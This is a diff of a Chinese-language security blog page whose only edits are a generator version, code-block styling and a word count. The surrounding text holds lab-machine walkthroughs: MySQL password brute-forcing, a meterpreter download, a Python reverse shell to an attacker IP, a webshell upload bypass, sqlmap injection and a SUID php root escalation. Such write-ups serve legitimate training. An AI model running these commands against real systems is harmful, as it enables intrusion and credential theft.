@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-	<meta name="generator" content="Hugo 0.154.5">
+	<meta name="generator" content="Hugo 0.155.3">
     
       <title>l1uyun&#39;s Blog</title>
     
@@ -213,7 +213,7 @@ function checkNightMode() {
 接下来得看 mysql 了
 hydra 好慢
 换了 ncrack 试试</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ncrack -T5 -v -u trainerjeff -P /usr/share/wordlists/rockyou.txt mysql://192.168.10.8
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ncrack -T5 -v -u trainerjeff -P /usr/share/wordlists/rockyou.txt mysql://192.168.10.8
 </span></span><span style="display:flex;"><span>sudo  medusa -h 192.168.10.8 -u trainerjeff -P /usr/share/wordlists/rockyou.txt -M mysql
 </span></span><span style="display:flex;"><span>sudo hydra -l trainerjeff -P /usr/share/wordlists/rockyou.txt 192.168.10.8 mysql
 </span></span></code></pre></div><p>没出来, 吐了, 每分钟八次. 太慢了. 看 wp 算了
@@ -225,14 +225,14 @@ hydra 好慢
 
 </p>
 <h2 id="枚举-mysql-信息">枚举 mysql 信息</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo mysql -h 192.168.10.8 -u trainerjeff -psoccer1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo mysql -h 192.168.10.8 -u trainerjeff -psoccer1
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_slowman_image_4.png" alt="HMM_slowman_image_4" /><figcaption>HMM_slowman_image_4</figcaption></figure>
 
 
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>|  <span style="color:#ae81ff">1</span> | gonzalo     tH1sS2stH3g0nz4l0pAsSWW0rDD!! 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>|  <span style="color:#ae81ff">1</span> | gonzalo     tH1sS2stH3g0nz4l0pAsSWW0rDD!! 
 </span></span><span style="display:flex;"><span>|  <span style="color:#ae81ff">2</span> | $SECRETLOGINURL /secretLOGIN/login.html  
 </span></span></code></pre></div><p>
 <figure class="md-figure">
@@ -291,7 +291,7 @@ hydra 好慢
 
       <div class="post-content">
         <h2 id="靶机-启动">靶机, 启动</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.10.16
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.10.16
 </span></span></code></pre></div><h2 id="端口扫描">端口扫描</h2>
 <p>
 <figure class="md-figure">
@@ -334,7 +334,7 @@ hydra 好慢
 
 
 然后还是用了 meterpreter</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://192.168.10.11:8000/shell.elf -O /tmp/shell.elf<span style="color:#f92672">&amp;&amp;</span>chmod <span style="color:#ae81ff">777</span> /tmp/shell.elf
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://192.168.10.11:8000/shell.elf -O /tmp/shell.elf<span style="color:#f92672">&amp;&amp;</span>chmod <span style="color:#ae81ff">777</span> /tmp/shell.elf
 </span></span></code></pre></div><h2 id="www-data-进一步收集信息">www-data ,进一步收集信息</h2>
 <p>/home/alabaster/nice_list. txt</p>
 <p>
@@ -350,7 +350,7 @@ hydra 好慢
 
 
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.10.11&#34;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;bash&#34;)&#39;</span> &gt; nice_or_naughty.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.10.11&#34;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;bash&#34;)&#39;</span> &gt; nice_or_naughty.py
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;import subprocess; subprocess.call([&#34;/tmp/newshell.elf&#34;])&#39;</span> &gt; nice_or_naughty.py
@@ -437,7 +437,7 @@ hydra 好慢
 
 
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sarah:bohicon
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sarah:bohicon
 </span></span></code></pre></div><h2 id="user-txt-pwd">USER. txt PWD</h2>
 <p>
 <figure class="md-figure">
@@ -459,7 +459,7 @@ hydra 好慢
 
 
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sarah@VivifyTech:~/.gnupg/crls.d$ cat DIR.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sarah@VivifyTech:~/.gnupg/crls.d$ cat DIR.txt
 </span></span><span style="display:flex;"><span>v:1:
 </span></span></code></pre></div><p>在用户目录里面发现了 TASK. txt 文件
 下次应该直接全局找一下. txt 文件</p>
@@ -469,7 +469,7 @@ hydra 好慢
 
 
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sarah@VivifyTech:~/.private$ cat Tasks.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sarah@VivifyTech:~/.private$ cat Tasks.txt
 </span></span><span style="display:flex;"><span>- Change the Design and architecture of the website
 </span></span><span style="display:flex;"><span>- Plan <span style="color:#66d9ef">for</span> an audit, it seems like our website is vulnerable
 </span></span><span style="display:flex;"><span>- Remind the team we need to schedule a party before going to holidays
@@ -520,7 +520,7 @@ hydra 好慢
       <div class="post-content">
         <h2 id="启动机器">启动机器</h2>
 <p>得指定网络接口</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo arp-scan -I eth5 -l
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo arp-scan -I eth5 -l
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_1.png" alt="HMM_zon_image_1" /><figcaption>HMM_zon_image_1</figcaption></figure>
@@ -528,7 +528,7 @@ hydra 好慢
 
 </p>
 <h2 id="端口扫描">端口扫描</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo rustscan -a 192.168.10.13 -r 1-65535 -t <span style="color:#ae81ff">8000</span> --ulimit <span style="color:#ae81ff">5000</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo rustscan -a 192.168.10.13 -r 1-65535 -t <span style="color:#ae81ff">8000</span> --ulimit <span style="color:#ae81ff">5000</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>sudo nmap 192.168.10.13 -sT -Pn -p22,80 -sV -sC -O -oN portscan/norm
 </span></span><span style="display:flex;"><span>
@@ -588,7 +588,7 @@ hydra 好慢
 </li>
 </ul>
 <p>使用空格绕过</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#34;webshell.jpeg .php&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#34;webshell.jpeg .php&#34;</span>
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_zon_image_9.png" alt="HMM_zon_image_9" /><figcaption>HMM_zon_image_9</figcaption></figure>
@@ -645,7 +645,7 @@ freddie</p>
 
 
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.10.12
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.10.12
 </span></span></code></pre></div><h2 id="port-scan">port scan</h2>
 <p>只有一个 80 端口
 
@@ -698,7 +698,7 @@ freddie</p>
 <h2 id="use-suid-file-to-get-root">use SUID file to get root</h2>
 <p><code>find / -type f -perm -u=s 2&gt;/dev/null</code>
 发现一个suid的 php</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./usr/bin/php7.0 -r <span style="color:#e6db74">&#34;pcntl_exec(&#39;/bin/sh&#39;, [&#39;-p&#39;]);&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./usr/bin/php7.0 -r <span style="color:#e6db74">&#34;pcntl_exec(&#39;/bin/sh&#39;, [&#39;-p&#39;]);&#34;</span>
 </span></span></code></pre></div><h2 id="root-txt-pwd">root. txt PWD</h2>
 <p>
 <figure class="md-figure">
@@ -733,14 +733,14 @@ freddie</p>
       <div class="post-content">
         <h2 id="主机发现">主机发现</h2>
 <p>使用 nmap 进行主机发现[[THM_Nmap Live Host Discovery(活动主机发现)]]</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap 192.168.10.1/24 -PA -sn -oN portscan/discovery.nmap
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap 192.168.10.1/24 -PA -sn -oN portscan/discovery.nmap
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_1.png" alt="HMM_vinylizer_image_1" /><figcaption>HMM_vinylizer_image_1</figcaption></figure>
 
 
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.10.10
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.10.10
 </span></span></code></pre></div><h2 id="端口扫描">端口扫描</h2>
 <p>
 <figure class="md-figure">
@@ -763,21 +763,21 @@ freddie</p>
 </p>
 <h2 id="利用登录页面的-sql-注入">利用登录页面的 sql 注入</h2>
 <p>sqlmap</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo sqlmap http://192.168.10.10/login.php --data <span style="color:#e6db74">&#34;username=admin&amp;password=admin&amp;login=&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo sqlmap http://192.168.10.10/login.php --data <span style="color:#e6db74">&#34;username=admin&amp;password=admin&amp;login=&#34;</span>
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_5.png" alt="HMM_vinylizer_image_5" /><figcaption>HMM_vinylizer_image_5</figcaption></figure>
 
 
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>---
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>---
 </span></span><span style="display:flex;"><span>Parameter: username <span style="color:#f92672">(</span>POST<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>    Type: time-based blind
 </span></span><span style="display:flex;"><span>    Title: MySQL &gt;<span style="color:#f92672">=</span> 5.0.12 AND time-based blind <span style="color:#f92672">(</span>query SLEEP<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>    Payload: username<span style="color:#f92672">=</span>admin<span style="color:#e6db74">&#39; AND (SELECT 7762 FROM (SELECT(SLEEP(5)))rBJA) AND &#39;</span>mJfQ<span style="color:#e6db74">&#39;=&#39;</span>mJfQ&amp;password<span style="color:#f92672">=</span>admin&amp;login<span style="color:#f92672">=</span>
 </span></span><span style="display:flex;"><span>---
 </span></span></code></pre></div><p>查看所有数据库</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> sudo sqlmap http://192.168.10.10/login.php --data <span style="color:#e6db74">&#34;username=admin&amp;password=admin&amp;login=&#34;</span> --dbs
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> sudo sqlmap http://192.168.10.10/login.php --data <span style="color:#e6db74">&#34;username=admin&amp;password=admin&amp;login=&#34;</span> --dbs
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_6.png" alt="HMM_vinylizer_image_6" /><figcaption>HMM_vinylizer_image_6</figcaption></figure>
@@ -785,7 +785,7 @@ freddie</p>
 
 
 查看数据库的表信息</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> sudo sqlmap http://192.168.10.10/login.php --data <span style="color:#e6db74">&#34;username=admin&amp;password=admin&amp;login=&#34;</span> --tables -D vinyl_marketplace
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> sudo sqlmap http://192.168.10.10/login.php --data <span style="color:#e6db74">&#34;username=admin&amp;password=admin&amp;login=&#34;</span> --tables -D vinyl_marketplace
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_7.png" alt="HMM_vinylizer_image_7" /><figcaption>HMM_vinylizer_image_7</figcaption></figure>
@@ -793,7 +793,7 @@ freddie</p>
 
 
 查看某一个表的列信息</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo sqlmap http://192.168.10.10/login.php --data <span style="color:#e6db74">&#34;username=admin&amp;password=admin&amp;login=&#34;</span> --columns -D vinyl_marketplace -T users
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo sqlmap http://192.168.10.10/login.php --data <span style="color:#e6db74">&#34;username=admin&amp;password=admin&amp;login=&#34;</span> --columns -D vinyl_marketplace -T users
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_vinylizer_image_8.png" alt="HMM_vinylizer_image_8" /><figcaption>HMM_vinylizer_image_8</figcaption></figure>
@@ -883,7 +883,7 @@ freddie</p>
 
 
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace cat README.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace cat README.txt
 </span></span><span style="display:flex;"><span>Hi, Cosette, don<span style="color:#e6db74">&#39;t forget to disable the debug mode in the web application, we don&#39;</span>t want security breaches.
 </span></span></code></pre></div><p>提示有一个 debug 页面可以利用</p>
 <h2 id="web-侦查">web 侦查</h2>
@@ -960,14 +960,14 @@ freddie</p>
 
 
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap 192.168.10.4 -p22,80 -Pn -sT -sV -O -sC -oA  portscan/nmap
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap 192.168.10.4 -p22,80 -Pn -sT -sV -O -sC -oA  portscan/nmap
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_5.png" alt="HMM_quick2_image_5|750" /><figcaption>HMM_quick2_image_5|750</figcaption></figure>
 
 
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap 192.168.10.4 -sT -Pn -p20,80 --script<span style="color:#f92672">=</span>vuln -oA  portscan/vuln
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap 192.168.10.4 -sT -Pn -p20,80 --script<span style="color:#f92672">=</span>vuln -oA  portscan/vuln
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_quick2_image_6.png" alt="HMM_quick2_image_6|700" /><figcaption>HMM_quick2_image_6|700</figcaption></figure>
@@ -979,7 +979,7 @@ freddie</p>
 尝试 local file include LFI
 获取到了/etc/passwd
 在 home 目录下有文件夹的有这两个用户</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>andrew:x:1000:1000: Andrew Speed:/home/andrew:/bin/bash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>andrew:x:1000:1000: Andrew Speed:/home/andrew:/bin/bash
 </span></span><span style="display:flex;"><span>nick:x:1001:1001: Nick Greenhorn,,,:/home/nick:/bin/bash
 </span></span></code></pre></div><p>获得了 user. txt</p>
 <p>
@@ -1157,7 +1157,7 @@ freddie</p>
 <footer class="footer">
   <div class="footer__inner">
     <div class="copyright copyright-font">
-      <span>共 129194 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
+      <span>共 129185 字 <br/> 还在努力更新中..</br>加油！加油啦！</span>
     </div>
       
     
